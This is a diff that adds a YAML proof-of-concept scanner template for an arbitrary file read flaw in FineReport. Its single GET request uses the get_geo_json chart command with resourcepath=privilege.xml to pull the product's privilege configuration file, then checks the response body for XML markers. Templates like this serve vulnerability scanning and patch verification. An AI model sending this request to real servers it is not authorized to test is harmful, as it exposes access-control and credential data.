@@ -1,0 +1,19 @@
+id: poc-yaml-finereport-arbitrary-file-read
+info:
+  name: FineReport 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: FineReport
+  osprey-id: vb_2019_0042
+variables:
+  r_path: '/seeyonreport/ReportServer
+
+    /WebReport/ReportServer'
+requests:
+- method: GET
+  path: '{{.r_path}}?op=chart&cmd=get_geo_json&resourcepath=privilege.xml'
+  expression: 'status_code != 404 && contains(body, "<?xml") && contains(body, "</PrivilegeManager>")
+
+    '
+transport: http
